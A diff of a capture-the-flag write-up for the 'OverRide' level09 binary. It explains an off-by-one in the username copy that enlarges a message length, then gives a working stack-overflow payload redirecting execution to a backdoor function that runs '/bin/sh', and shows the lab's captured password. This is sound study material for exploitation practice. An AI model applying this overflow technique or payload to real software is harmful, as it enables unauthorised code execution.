@@ -1,59 +1,74 @@
-level09:     file format elf64-x86-64
-
-DYNAMIC RELOCATION RECORDS
-OFFSET           TYPE              VALUE
-0000000000201fb0 R_X86_64_RELATIVE  *ABS*+0x0000000000000b60
-0000000000201fc8 R_X86_64_RELATIVE  *ABS*+0x0000000000000ad0
-0000000000201fd0 R_X86_64_RELATIVE  *ABS*+0x0000000000000aa8
-0000000000202040 R_X86_64_RELATIVE  *ABS*+0x0000000000202040
-0000000000201fb8 R_X86_64_GLOB_DAT  stdin
-0000000000201fc0 R_X86_64_GLOB_DAT  __gmon_start__
-0000000000201fd8 R_X86_64_GLOB_DAT  _Jv_RegisterClasses
-0000000000201fe0 R_X86_64_GLOB_DAT  __cxa_finalize
-0000000000202000 R_X86_64_JUMP_SLOT  strncpy
-0000000000202008 R_X86_64_JUMP_SLOT  puts
-0000000000202010 R_X86_64_JUMP_SLOT  system
-0000000000202018 R_X86_64_JUMP_SLOT  printf
-0000000000202020 R_X86_64_JUMP_SLOT  __libc_start_main
-0000000000202028 R_X86_64_JUMP_SLOT  fgets
-0000000000202030 R_X86_64_JUMP_SLOT  __cxa_finalize
-
-# In the disas, this seems a bit odd and btw it has been compiled on 64 bits that's why the adresse is not like we usally have
-
-000000000000088c <secret_backdoor>:
- 88c:	55                   	push   %rbp
- 88d:	48 89 e5             	mov    %rsp,%rbp
- 890:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
- 894:	48 8b 05 1d 17 20 00 	mov    0x20171d(%rip),%rax        # 201fb8 <_DYNAMIC+0x198>
- 89b:	48 8b 00             	mov    (%rax),%rax
- 89e:	48 89 c2             	mov    %rax,%rdx
- 8a1:	48 8d 45 80          	lea    -0x80(%rbp),%rax
- 8a5:	be 80 00 00 00       	mov    $0x80,%esi
- 8aa:	48 89 c7             	mov    %rax,%rdi
- 8ad:	e8 be fe ff ff       	callq  770 <fgets@plt>
- 8b2:	48 8d 45 80          	lea    -0x80(%rbp),%rax
- 8b6:	48 89 c7             	mov    %rax,%rdi
- 8b9:	e8 82 fe ff ff       	callq  740 <system@plt>
- 8be:	c9                   	leaveq
- 8bf:	c3                   	retq
- 
- # Kowalski analysis 🫡
- 
- ./level09
+level09@OverRide:~$ ./level09 
 --------------------------------------------
 |   ~Welcome to l33t-m$n ~    v1337        |
 --------------------------------------------
 >: Enter your username
->>: bob                       # Inputed
->: Welcome, bob
+>>: test
+>: Welcome, test
 >: Msg @Unix-Dude
->>: bob                       # Inputed
+>>: test
 >: Msg sent!
+
+# Tested with very long input 
+>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude   # Only 41 char are printed, and i can't manage to make it segfault
+
+# let's look at the code
+# handle_msg function
+
+   0x00005555555548cb <+11>:	lea    rax,[rbp-0xc0]
+   0x00005555555548d2 <+18>:	add    rax,0x8c                 # 140 char of data
+   0x00005555555548d8 <+24>:	mov    QWORD PTR [rax],0x0
+   0x00005555555548df <+31>:	mov    QWORD PTR [rax+0x8],0x0
+   0x00005555555548e7 <+39>:	mov    QWORD PTR [rax+0x10],0x0  # Those line create a 40 bytes space for our username
+   0x00005555555548ef <+47>:	mov    QWORD PTR [rax+0x18],0x0
+   0x00005555555548f7 <+55>:	mov    QWORD PTR [rax+0x20],0x0
+   
+   0x00005555555548ff <+63>:	mov    DWORD PTR [rbp-0xc],0x8c  # Set the max size of msg
+   
+# We can see a struct like object being created:
+
+typedef struct msg
+{
+  char    data[140];
+  char    username[40];
+  size_t  size;
+} msg_t;
+
+# set_username function
+
+# Everything looks well protected, but we find a flaw
+
+   0x0000555555554a66 <+153>:	add    DWORD PTR [rbp-0x4],0x1
+   0x0000555555554a6a <+157>:	cmp    DWORD PTR [rbp-0x4],0x28
  
- # Seems straightforward, overflow one of the 2 strings and override something with the secret backdoor function and get the flag
- # So let's see how set_username and set_msg are built
- 
- 
- 
- 
- 
+# The program check for the username length 1 by 1 with a conditional jump if length > 40 ! 
+# But we saw that in the struct the username space was 40 bytes long not 41 ! So we have 1 byte to exploit! The byte will replace the next element in the strcut
+# So we can print 'A' * 40 + '\xff' (\xff = 255 biggest 1 bytes number), by making this, the  "size_t  size" will be 255 instead of 140 !!
+
+# Let's see where it is used now
+# set_msg funct
+
+   0x00005555555549c6 <+148>:	call   0x555555554720 <strncpy@plt> # Here it is, size is used in strncpy,
+   # So now that we made it longer than the allocated space of the message we can look for an offset
+   
+   #
+   #
+   #  INSERT OFFSET FIND HERE
+   #
+   #
+
+Now that we have the offset and a way to go where we want we need a target ! 
+Lucky for us there is a function 0x55555555488c <secret_backdoor> in the code, that calls system with one argument we provide!
+So we just have to redirect the eip on this function, and give it "/bin/sh" in argument and we should be good ! 
+SO here is our payload :
+[40* padding] + [size = '\xff'] + ['\n' to go in next input] + [200* offset padding] + [secret_backdoor address in little endian] + [arg '/bin/sh']
+
+level09@OverRide:~$ (python -c "print 'a'*40 + '\xff' + '\n' + '\x90'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '/bin/sh'" ; cat -) | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
+>>: >: Msg sent!
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
